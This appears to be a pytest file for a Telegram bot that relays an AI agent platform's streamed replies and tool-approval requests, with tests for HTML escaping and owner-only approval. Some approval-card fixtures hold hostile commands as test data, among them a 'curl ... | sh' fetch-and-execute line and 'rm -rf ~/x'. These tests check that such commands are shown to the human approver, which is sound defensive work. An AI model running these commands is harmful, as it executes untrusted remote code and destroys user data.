        assert MODEL_LOOKUP_FAILED_REPLY in message.reply_text.await_args.args[0]
        assert bot._channel_sessions[("-100200", "12345")] == ("ws-old", "100")  # type: ignore[attr-defined]

    def test_says_the_model_is_not_available(self) -> None:
        from turnstone.channels._routing import MODEL_UNAVAILABLE_REPLY
        from turnstone.sdk._types import TurnstoneAPIError

        bot, router, ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(
            side_effect=TurnstoneAPIError(503, "node text", code="model_not_loaded")
        )
        update, context, _message = self._command_update(is_forum=True)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        assert MODEL_UNAVAILABLE_REPLY in ptb.send_message.await_args.kwargs["text"]
        router.send_message.assert_not_awaited()

    def test_uses_the_channel_model(self) -> None:
        bot, router, _ptb = _make_bot()
        router.get_channel_default_alias = AsyncMock(return_value="telegram-model")
        router.get_or_create_workstream = AsyncMock(return_value=("ws-new", True))
        update, context, _message = self._command_update(is_forum=True)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        assert router.get_or_create_workstream.await_args.kwargs["model"] == "telegram-model"


# ---------------------------------------------------------------------------
# DM continuity
# ---------------------------------------------------------------------------


class TestDmContinuity:
    def test_dm_messages_reuse_same_workstream(self) -> None:
        bot, router, _ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(side_effect=[("ws-dm", True), ("ws-dm", False)])

        _run(bot._handle_dm(777, "12345", "hello"))  # type: ignore[attr-defined]
        _run(bot._handle_dm(777, "12345", "again"))  # type: ignore[attr-defined]

        assert router.get_or_create_workstream.await_count == 2
        assert router.send_message.await_count == 2


# ---------------------------------------------------------------------------
# Reply-chain session membership
# ---------------------------------------------------------------------------


class TestSessionMsgTracking:
    def test_track_session_msg_caps_chain(self) -> None:
        from turnstone.channels.telegram.bot import _SESSION_MSG_CAP

        bot, _router, _ptb = _make_bot()
        for i in range(_SESSION_MSG_CAP + 50):
            bot._track_session_msg(("c", "u"), i)  # type: ignore[attr-defined]

        tracked = bot._session_msgs[("c", "u")]  # type: ignore[attr-defined]
        assert len(tracked) == _SESSION_MSG_CAP
        # Oldest entries evicted first.
        assert 0 not in tracked
        assert _SESSION_MSG_CAP + 49 in tracked


# ---------------------------------------------------------------------------
# Route recovery + session archival
# ---------------------------------------------------------------------------


class TestRecoverRoutes:
    """Tests for TurnstoneTelegramBot._recover_routes on bot startup."""

    def test_latest_thread_per_user_wins(self) -> None:
        """When multiple routes exist for the same (chat, user), the largest
        thread anchor populates _channel_sessions."""
        bot, _router, _ptb = _make_bot()
        bot.storage.list_channel_routes_by_type = MagicMock(  # type: ignore[attr-defined]
            return_value=[
                {"ws_id": "ws-old", "channel_id": "-100200:111:100"},
                {"ws_id": "ws-new", "channel_id": "-100200:111:200"},
            ]
        )
        bot.subscribe_ws = AsyncMock()  # type: ignore[attr-defined]

        _run(bot._recover_routes())  # type: ignore[attr-defined]

        assert bot._channel_sessions == {("-100200", "111"): ("ws-new", "200")}  # type: ignore[attr-defined]
        # Both routes get resubscribed so their SSE streams stay active.
        assert bot.subscribe_ws.await_count == 2  # type: ignore[attr-defined]

    def test_dm_routes_skip_session_table(self) -> None:
        """A route without a thread_id still gets subscribed but never
        populates _channel_sessions."""
        bot, _router, _ptb = _make_bot()
        bot.storage.list_channel_routes_by_type = MagicMock(  # type: ignore[attr-defined]
            return_value=[{"ws_id": "ws-dm", "channel_id": "-100200:111"}]
        )
        bot.subscribe_ws = AsyncMock()  # type: ignore[attr-defined]

        _run(bot._recover_routes())  # type: ignore[attr-defined]

        assert bot._channel_sessions == {}  # type: ignore[attr-defined]
        bot.subscribe_ws.assert_awaited_once_with("ws-dm", "-100200:111")  # type: ignore[attr-defined]


class TestArchiveSession:
    """Tests for TurnstoneTelegramBot._archive_session cleanup."""

    def test_archive_drops_route_and_closes_workstream(self) -> None:
        bot, router, ptb = _make_bot()
        bot._channel_sessions[("-100200", "111")] = ("ws-old", "555")  # type: ignore[attr-defined]
        bot._subscribed_ws.add("ws-old")  # type: ignore[attr-defined]

        _run(bot._archive_session(-100200, "111", "ws-old", "555"))  # type: ignore[attr-defined]

        router.delete_route.assert_awaited_once_with(
            "telegram", "-100200:111:555", expected_ws_id="ws-old"
        )
        router.close_workstream.assert_awaited_once_with("ws-old")
        assert ("-100200", "111") not in bot._channel_sessions  # type: ignore[attr-defined]
        # Archive notice posted in the old thread.
        assert "archived" in ptb.send_message.await_args.kwargs["text"]


# ---------------------------------------------------------------------------
# StreamingMessage
# ---------------------------------------------------------------------------


class TestStreamingMessage:
    """Tests for the StreamingMessage helper."""

    def _ptb(self) -> MagicMock:
        ptb = MagicMock()
        ptb.send_message = AsyncMock(return_value=SimpleNamespace(message_id=1))
        ptb.edit_message_text = AsyncMock(return_value=SimpleNamespace(message_id=1))
        return ptb

    def test_append_accumulates(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        sm = StreamingMessage(bot=self._ptb(), chat_id=-100, edit_interval=999.0)

        _run(sm.append("hello "))
        _run(sm.append("world"))

        assert sm.accumulated_text == "hello world"

    def test_finalize_sends_when_no_prior_message(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        ptb = self._ptb()
        sm = StreamingMessage(bot=ptb, chat_id=-100, edit_interval=999.0)

        _run(sm.append("hello"))
        _run(sm.finalize())

        ptb.send_message.assert_awaited_once()
        assert sm.message_id == 1

    def test_finalize_edits_existing_message(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        ptb = self._ptb()
        sm = StreamingMessage(bot=ptb, chat_id=-100, edit_interval=0.0)

        _run(sm.append("hi"))
        assert sm.message_id == 1

        _run(sm.finalize())
        ptb.edit_message_text.assert_awaited()

    def test_finalize_chunks_long_content(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        ptb = self._ptb()
        sm = StreamingMessage(bot=ptb, chat_id=-100, max_length=200, edit_interval=999.0)

        _run(sm.append("a" * 300))
        _run(sm.finalize())

        assert ptb.send_message.await_count >= 2

    def test_finalize_empty_is_noop(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        ptb = self._ptb()
        sm = StreamingMessage(bot=ptb, chat_id=-100)

        _run(sm.finalize())
        ptb.send_message.assert_not_awaited()

    def test_forum_thread_placed_in_topic(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        ptb = self._ptb()
        sm = StreamingMessage(bot=ptb, chat_id=-100, thread=(555, 0), edit_interval=999.0)

        _run(sm.append("hi"))
        _run(sm.finalize())

        assert ptb.send_message.await_args.kwargs["message_thread_id"] == 555

    def test_display_escapes_entities(self) -> None:
        from turnstone.channels.telegram.bot import StreamingMessage

        sm = StreamingMessage(bot=self._ptb(), chat_id=-100, edit_interval=999.0)

        _run(sm.append("<b> & </b>"))

        assert "&lt;b&gt; &amp; &lt;/b&gt;" in sm._display


# ---------------------------------------------------------------------------
# _on_ws_event dispatch
# ---------------------------------------------------------------------------


class TestWsEventDispatch:
    """Tests for SSE event handling in the Telegram bot."""

    def test_content_event_creates_streaming_message(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ContentEvent

        bot, _router, _ptb = _make_bot()

        event = ContentEvent(ws_id="ws-1", text="Hello")
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        assert "ws-1" in bot._streaming  # type: ignore[attr-defined]

    def test_stream_end_finalizes_streaming(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ContentEvent, StreamEndEvent

        bot, _router, _ptb = _make_bot()
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")

        _run(bot._on_ws_event("ws-1", route, ContentEvent(ws_id="ws-1", text="Hi")))  # type: ignore[attr-defined]
        assert "ws-1" in bot._streaming  # type: ignore[attr-defined]

        _run(bot._on_ws_event("ws-1", route, StreamEndEvent(ws_id="ws-1")))  # type: ignore[attr-defined]
        assert "ws-1" not in bot._streaming  # type: ignore[attr-defined]

    def test_stream_end_no_streaming_is_noop(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import StreamEndEvent

        bot, _router, _ptb = _make_bot()
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")

        _run(bot._on_ws_event("ws-1", route, StreamEndEvent(ws_id="ws-1")))  # type: ignore[attr-defined]
        assert "ws-1" not in bot._streaming  # type: ignore[attr-defined]

    def test_stream_end_retracks_notification_reply(self) -> None:
        """A response streamed after a notification reply is tracked so
        replies to IT route back to the same workstream."""
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ContentEvent, StreamEndEvent

        bot, _router, _ptb = _make_bot()
        reply_route = TelegramRoute(chat="-100200", user_id="12345")
        bot._notify_reply_routes["ws-1"] = reply_route  # type: ignore[attr-defined]
        route = TelegramRoute(chat="-100200", user_id="12345", thread_id="555")

        _run(bot._on_ws_event("ws-1", route, ContentEvent(ws_id="ws-1", text="Hi")))  # type: ignore[attr-defined]
        _run(bot._on_ws_event("ws-1", route, StreamEndEvent(ws_id="ws-1")))  # type: ignore[attr-defined]

        # The streamed message's id is tracked for the origin ws.
        sm_id = bot._streaming.pop("ws-1", None)  # type: ignore[attr-defined]
        assert sm_id is None  # consumed by stream end
        tracked = [
            key
            for key, (ws, _r) in bot._notify_ws_map.items()
            if ws == "ws-1"  # type: ignore[attr-defined]
        ]
        assert tracked
        # The override is popped so the next turn uses the session route.
        assert "ws-1" not in bot._notify_reply_routes  # type: ignore[attr-defined]

    def test_error_event_posts_message(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ErrorEvent

        bot, _router, ptb = _make_bot()
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")

        event = ErrorEvent(ws_id="ws-1", message="Something went wrong")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        ptb.send_message.assert_awaited_once()
        text = ptb.send_message.call_args.kwargs["text"]
        assert "Something went wrong" in text

    def test_error_event_escapes_hostile_message(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ErrorEvent

        bot, _router, ptb = _make_bot()
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")

        event = ErrorEvent(ws_id="ws-1", message="boom <tag> & stuff")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        text = ptb.send_message.call_args.kwargs["text"]
        assert "boom &lt;tag&gt; &amp; stuff" in text
        assert "<tag>" not in text

    def test_approve_request_auto_approve(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, router, ptb = _make_bot(auto_approve=True)

        event = ApproveRequestEvent(
            ws_id="ws-1", items=[{"func_name": "bash", "needs_approval": True}]
        )
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        router.send_approval.assert_awaited_once_with("ws-1", "", approved=True)
        assert "auto-approved" in ptb.send_message.await_args.kwargs["text"]

    def test_approve_request_sends_approval_buttons(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, _router, ptb = _make_bot()

        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[{"call_id": "c-1", "func_name": "bash", "needs_approval": True}],
        )
        route = TelegramRoute(chat="-100200", user_id="U12345", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        ptb.send_message.assert_awaited_once()
        call_kwargs = ptb.send_message.call_args.kwargs
        keyboard = call_kwargs["reply_markup"]
        row = keyboard.inline_keyboard[0]
        assert row[0].callback_data == "ts_approve"
        assert row[1].callback_data == "ts_deny"
        # Tracked under (ws_id, cycle_id) so concurrent cycles each get
        # their own Telegram message.
        entry = bot._pending_approval[("ws-1", "cyc-1")]  # type: ignore[attr-defined]
        assert entry.owner_user_id == "U12345"
        assert entry.cycle_id == "cyc-1"
        assert entry.call_ids == frozenset({"c-1"})

    def test_policy_deny_notice_escapes_names_but_feedback_stays_verbatim(self) -> None:
        from turnstone.channels._routing import PolicyVerdict
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, router, ptb = _make_bot()
        bot.router.evaluate_tool_policies = AsyncMock(  # type: ignore[attr-defined]
            return_value=PolicyVerdict(kind="deny", denied_tools=["evil<b>tool"])
        )

        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[{"call_id": "c-1", "func_name": "evil<b>tool", "needs_approval": True}],
        )
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        # Telegram-rendered notice is escaped...
        text = ptb.send_message.call_args.kwargs["text"]
        assert "evil&lt;b&gt;tool" in text
        assert "<b>tool" not in text
        # ...but the feedback routed back to the server stays verbatim —
        # projection happens per audience at render, never upstream.
        router.send_approval.assert_awaited_once_with(
            "ws-1",
            "cyc-1",
            approved=False,
            feedback="Blocked by tool policy: evil<b>tool",
        )

    def test_policy_allow_auto_resolves(self) -> None:
        from turnstone.channels._routing import PolicyVerdict
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, router, ptb = _make_bot()
        bot.router.evaluate_tool_policies = AsyncMock(  # type: ignore[attr-defined]
            return_value=PolicyVerdict(kind="allow")
        )

        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[{"call_id": "c-1", "func_name": "read_file"}],
        )
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        router.send_approval.assert_awaited_once_with("ws-1", "cyc-1", approved=True)
        assert "approved by policy" in ptb.send_message.await_args.kwargs["text"]

    def test_auto_approve_tools_match(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, router, ptb = _make_bot(auto_approve_tools=["bash"])

        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[{"call_id": "c-1", "func_name": "bash", "needs_approval": True}],
        )
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        router.send_approval.assert_awaited_once_with("ws-1", "cyc-1", approved=True)
        assert "auto-approved" in ptb.send_message.await_args.kwargs["text"]

    def test_auto_approve_tools_mismatch_prompts(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, router, ptb = _make_bot(auto_approve_tools=["read_file"])

        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[
                {"call_id": "c-1", "func_name": "read_file"},
                {"call_id": "c-2", "func_name": "bash", "needs_approval": True},
            ],
        )
        route = TelegramRoute(chat="-100", user_id="U1", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        router.send_approval.assert_not_awaited()
        ptb.send_message.assert_awaited_once()

    def test_intent_verdict_updates_approval_message(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import IntentVerdictEvent

        bot, _router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100,
            message_id=999,
            owner_user_id="U12345",
            cycle_id="cyc-1",
            call_ids=frozenset({"c-1"}),
        )

        event = IntentVerdictEvent(
            ws_id="ws-1",
            call_id="c-1",
            func_name="bash",
            risk_level="high",
            confidence=0.9,
            intent_summary="Dangerous",
        )
        route = TelegramRoute(chat="-100", user_id="U12345", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        ptb.edit_message_text.assert_awaited_once()

    def test_intent_verdict_escapes_judge_fields(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import IntentVerdictEvent

        bot, _router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100,
            message_id=999,
            owner_user_id="U9",
            body_html="<b>Tool Approval Required</b>",
            cycle_id="cyc-1",
            call_ids=frozenset({"c-1"}),
        )

        event = IntentVerdictEvent(
            ws_id="ws-1",
            call_id="c-1",
            func_name="bash <cmd>",
            risk_level="high",
            confidence=0.9,
            intent_summary="pings <a> & <b>",
        )
        route = TelegramRoute(chat="-100", user_id="U9", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        text = ptb.edit_message_text.call_args.kwargs["text"]
        assert "bash &lt;cmd&gt;" in text
        assert "pings &lt;a&gt; &amp; &lt;b&gt;" in text
        assert "<a>" not in text
        # Bot framing survives around the escaped fields.
        assert "<b>Judge Verdict:</b>" in text

    def test_intent_verdicts_stack(self) -> None:
        """Two verdicts for one cycle accumulate instead of overwriting."""
        from turnstone.channels.telegram.bot import _PendingApproval
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import IntentVerdictEvent

        bot, _router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100,
            message_id=999,
            owner_user_id="U9",
            body_html="<b>body</b>",
            cycle_id="cyc-1",
            call_ids=frozenset({"c-1", "c-2"}),
        )
        route = TelegramRoute(chat="-100", user_id="U9", thread_id="555")

        _run(
            bot._on_ws_event(  # type: ignore[attr-defined]
                "ws-1",
                route,
                IntentVerdictEvent(ws_id="ws-1", call_id="c-1", func_name="bash"),
            )
        )
        _run(
            bot._on_ws_event(  # type: ignore[attr-defined]
                "ws-1",
                route,
                IntentVerdictEvent(ws_id="ws-1", call_id="c-2", func_name="tasks"),
            )
        )

        text = ptb.edit_message_text.call_args.kwargs["text"]
        assert "<code>bash</code>" in text
        assert "<code>tasks</code>" in text

    def test_intent_verdict_for_other_call_ignored(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import IntentVerdictEvent

        bot, _router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100,
            message_id=999,
            owner_user_id="U9",
            cycle_id="cyc-1",
            call_ids=frozenset({"c-1"}),
        )
        route = TelegramRoute(chat="-100", user_id="U9", thread_id="555")

        event = IntentVerdictEvent(ws_id="ws-1", call_id="c-2", func_name="bash")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        ptb.edit_message_text.assert_not_awaited()

    def test_approval_resolved_clears_pending(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApprovalResolvedEvent

        bot, _router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-9")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100,
            message_id=999,
            owner_user_id="U12345",
            body_html="<b>body</b>",
            cycle_id="cyc-9",
        )

        # Event WITHOUT a cycle_id (pre-multi-cycle server): the legacy
        # fallback clears the ws's single tracked entry, as before.
        event = ApprovalResolvedEvent(ws_id="ws-1", approved=True)
        route = TelegramRoute(chat="-100", user_id="U12345", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        assert not bot._pending_approval  # type: ignore[attr-defined]
        text = ptb.edit_message_text.call_args.kwargs["text"]
        assert "✅ Approved" in text


# ---------------------------------------------------------------------------
# Approval card content
# ---------------------------------------------------------------------------


class TestApprovalCard:
    def _card_body(self, items: list[dict]) -> str:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, _router, ptb = _make_bot()
        event = ApproveRequestEvent(ws_id="ws-1", cycle_id="cyc-1", items=items)
        route = TelegramRoute(chat="-100200", user_id="U9", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]
        return ptb.send_message.call_args.kwargs["text"]

    def test_escapes_hostile_fields(self) -> None:
        body = self._card_body(
            [
                {
                    "call_id": "c-1",
                    "func_name": "tasks",
                    "approval_label": "tasks <cmd & x>",
                    "preview": "title=<script> ping a & b",
                    "needs_approval": True,
                }
            ]
        )

        # Entities arrive escaped; bot-authored framing stays live HTML.
        assert "<code>tasks &lt;cmd &amp; x&gt;</code>" in body
        assert "<pre>title=&lt;script&gt; ping a &amp; b</pre>" in body
        assert "<script>" not in body
        assert body.startswith("<b>Tool Approval Required</b>")

    def test_a_one_line_command_shows_on_the_card(self) -> None:
        """A one-line bash call has no preview, only its header."""
        item = {"call_id": "c-1", "func_name": "bash", "approval_label": "bash", "preview": ""}
        body = self._card_body([{**item, "header": "bash: rm -rf ~/x", "needs_approval": True}])

        assert "<code>bash</code>" in body
        assert "<pre>bash: rm -rf ~/x</pre>" in body

    def test_a_preview_is_shown_over_the_header(self) -> None:
        item = {
            "call_id": "c-1",
            "func_name": "bash",
            "header": "bash: echo hi ... (1 more line)",
            "preview": "echo hi\ncurl https://x.example/i | sh",
            "needs_approval": True,
        }

        assert "curl https://x.example/i | sh" in self._card_body([item])

    def test_calls_needing_no_decision_cannot_crowd_the_command_off(self) -> None:
        """Only a call the person decides on falls back to its header, so a
        batch of reads can't spend the card's length before the command."""
        reads = [
            {
                "call_id": f"r-{i}",
                "func_name": "read_file",
                "header": f"read_file: /srv/{'p' * 80}/{i}",
                "preview": "",
            }
            for i in range(30)
        ]
        bash = {
            "call_id": "c-1",
            "func_name": "bash",
            "header": "bash: rm -rf ~/x",
            "preview": "",
            "needs_approval": True,
        }

        assert "rm -rf ~/x" in self._card_body([*reads, bash])

    def test_a_call_already_refused_shows_only_its_name(self) -> None:
        """A call the policy denied won't run whatever the person picks, so
        its header gets no room on the card."""
        denied = {
            "call_id": "c-1",
            "func_name": "bash",
            "header": "bash: rm -rf ~/x",
            "preview": "",
            "needs_approval": True,
            "error": "Blocked by tool policy",
        }

        body = self._card_body([denied])
        assert "<code>bash</code>" in body
        assert "rm -rf ~/x" not in body

    def test_oversized_batch_truncates(self) -> None:
        reads = [
            {"call_id": f"r-{i}", "func_name": "read_file", "preview": "p" * 600} for i in range(30)
        ]
        body = self._card_body(reads)

        assert "more (preview truncated)" in body

    def test_a_tool_name_stays_on_its_line_in_a_code_span(self) -> None:
        """An unknown tool's name is flattened — no newline can break the
        span, and a backtick can't end it early."""
        body = self._card_body([{"call_id": "c-1", "func_name": "x` *ok*\n*bad*", "preview": "p"}])

        assert "x' *ok* *bad*" in body


# ---------------------------------------------------------------------------
# Approval ownership (callback queries)
# ---------------------------------------------------------------------------


class TestApprovalOwnership:
    def test_non_owner_cannot_approve(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval

        bot, router, _ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100200,
            message_id=42,
            owner_user_id="777",
            cycle_id="cyc-1",
        )
        query = _make_callback_query("ts_approve", 999, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        query.answer.assert_awaited_once()
        assert "Only the session owner" in query.answer.await_args.args[0]
        router.send_approval.assert_not_awaited()

    def test_non_owner_cannot_deny(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval

        bot, router, _ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100200,
            message_id=42,
            owner_user_id="777",
            cycle_id="cyc-1",
        )
        query = _make_callback_query("ts_deny", 999, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_approval.assert_not_awaited()

    def test_owner_can_approve(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval

        bot, router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100200,
            message_id=42,
            owner_user_id="777",
            cycle_id="cyc-1",
        )
        query = _make_callback_query("ts_approve", 777, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_approval.assert_awaited_once_with("ws-1", "cyc-1", approved=True)
        ptb.edit_message_text.assert_awaited_once()
        # Resolved locally: the entry is dropped so the subsequent
        # ApprovalResolvedEvent doesn't rewrite the message twice.
        assert ("ws-1", "cyc-1") not in bot._pending_approval  # type: ignore[attr-defined]

    def test_owner_can_deny(self) -> None:
        from turnstone.channels.telegram.bot import _PendingApproval

        bot, router, ptb = _make_bot()
        bot._pending_approval[("ws-1", "cyc-1")] = _PendingApproval(  # type: ignore[attr-defined]
            chat_id=-100200,
            message_id=42,
            owner_user_id="777",
            cycle_id="cyc-1",
        )
        query = _make_callback_query("ts_deny", 777, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_approval.assert_awaited_once_with("ws-1", "cyc-1", approved=False)
        text = ptb.edit_message_text.call_args.kwargs["text"]
        assert "⛔" in text

    def test_missing_entry_alerts(self) -> None:
        bot, router, _ptb = _make_bot()
        query = _make_callback_query("ts_approve", 777, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        query.answer.assert_awaited_once()
        router.send_approval.assert_not_awaited()

    def test_unparseable_message_alerts(self) -> None:
        """Callback queries for messages older than 48 hours carry an
        inaccessible message — the marker is unreadable."""
        bot, router, _ptb = _make_bot()
        query = _make_callback_query("ts_approve", 777, "some old message text")
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        query.answer.assert_awaited_once()
        router.send_approval.assert_not_awaited()

    def test_unknown_callback_data_ignored(self) -> None:
        bot, router, _ptb = _make_bot()
        query = _make_callback_query("ts_other", 777, _approval_body())
        update = SimpleNamespace(callback_query=query)

        _run(bot._on_callback(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_approval.assert_not_awaited()


# ---------------------------------------------------------------------------
# Notification tracking
# ---------------------------------------------------------------------------


class TestNotificationTracking:
    """Tests for notification message tracking."""

    def test_track_notification_stores_entry(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, _router, _ptb = _make_bot()
        route = TelegramRoute(chat="-100200", user_id="12345", thread_id="555")
        bot._track_notification(1000, "ws-1", route)  # type: ignore[attr-defined]
        assert bot._notify_ws_map[(-100200, 1000)] == ("ws-1", route)  # type: ignore[attr-defined]

    def test_track_notification_evicts_oldest(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, _router, _ptb = _make_bot()
        bot._MAX_NOTIFY_TRACKING = 3  # type: ignore[attr-defined]
        for i, ws in enumerate(["ws-1", "ws-2", "ws-3"], start=1):
            bot._notify_ws_map[(-100, i)] = (  # type: ignore[attr-defined]
                ws,
                TelegramRoute(chat="-100", user_id=str(i)),
            )

        bot._track_notification(4, "ws-4", TelegramRoute(chat="-100", user_id="4"))  # type: ignore[attr-defined]

        assert (-100, 4) in bot._notify_ws_map  # type: ignore[attr-defined]
        assert (-100, 1) not in bot._notify_ws_map  # type: ignore[attr-defined]
        assert len(bot._notify_ws_map) <= 3  # type: ignore[attr-defined]

    def test_send_notification_tracks_message(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, _router, ptb = _make_bot()
        ptb.send_message = AsyncMock(
            side_effect=[
                SimpleNamespace(message_id=101),
                SimpleNamespace(message_id=102),
            ]
        )

        msg_id = _run(
            bot.send_notification(  # type: ignore[attr-defined]
                "-100200:12345",
                "x" * 5000,
                "ws-1",
            )
        )

        # The last chunk's message id is returned and tracked.
        assert msg_id == "102"
        stored_ws, stored_route = bot._notify_ws_map[(-100200, 102)]  # type: ignore[attr-defined]
        assert stored_ws == "ws-1"
        assert stored_route == TelegramRoute(chat="-100200", user_id="12345")

    def test_send_notification_without_user_component_not_tracked(self) -> None:
        bot, _router, _ptb = _make_bot()

        msg_id = _run(bot.send_notification("12345", "hello", "ws-1"))  # type: ignore[attr-defined]

        assert msg_id == "1000"
        assert not bot._notify_ws_map  # type: ignore[attr-defined]

    def test_send_rejects_non_numeric_target(self) -> None:
        bot, _router, _ptb = _make_bot()

        with pytest.raises(ValueError, match="not a valid target"):
            _run(bot.send_notification("not-a-chat-id", "hello", "ws-1"))  # type: ignore[attr-defined]


class TestSendEscaping:
    def test_send_escapes_notification_content(self) -> None:
        bot, _router, ptb = _make_bot()

        _run(
            bot.send(  # type: ignore[attr-defined]
                "-100200:12345",
                "Task '<b>deploy & retry</b>' is idle",
            )
        )

        text = ptb.send_message.call_args.kwargs["text"]
        assert "&lt;b&gt;deploy &amp; retry&lt;/b&gt;" in text
        assert "<b>deploy" not in text

    def test_send_chunks_long_content(self) -> None:
        bot, _router, ptb = _make_bot()

        last_id = _run(bot.send("-100200:12345", "x" * 9000))  # type: ignore[attr-defined]

        assert ptb.send_message.await_count >= 2
        assert last_id != ""


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


class TestChannelCLI:
    """Tests for the channel CLI entry point with Telegram args."""

